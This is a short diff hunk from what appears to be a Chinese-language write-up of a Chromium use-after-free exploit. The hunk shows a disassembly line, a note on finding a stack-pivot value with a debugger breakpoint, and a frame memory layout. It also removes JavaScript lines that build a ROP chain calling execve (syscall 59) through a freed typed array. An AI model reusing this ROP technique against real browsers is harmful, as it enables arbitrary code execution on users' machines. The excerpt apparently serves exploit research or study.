@@ -166,15 +166,6 @@ eTree*, content::FrameTreeNode*, int, int, bool)+234>
 .text:0000000003C582E6                 mov     rsi, r14
 ```
 ## rop布局
-uaf_ta[3] = BigInt(pop_rdi_ret);
-    uaf_ta[4] = BigInt(0x31313131313131); // vtable+0x178
-    uaf_ta[5] = BigInt(pop_rsi_ret);
-    uaf_ta[6] = BigInt(0);
-    uaf_ta[7] = BigInt(pop_rdx_ret);
-    uaf_ta[8] = BigInt(0);
-    uaf_ta[9] = BigInt(pop_rax_ret);
-    uaf_ta[10] = BigInt(59);
-    uaf_ta[11] = BigInt(syscall);
 xchg rax, rsp中rax的值通过在IsRenderFrameLive下断点即可得知
 ```
 frame_addr =>   [0x00] : vtable  ==> frame_addr + 0x10  ------------\
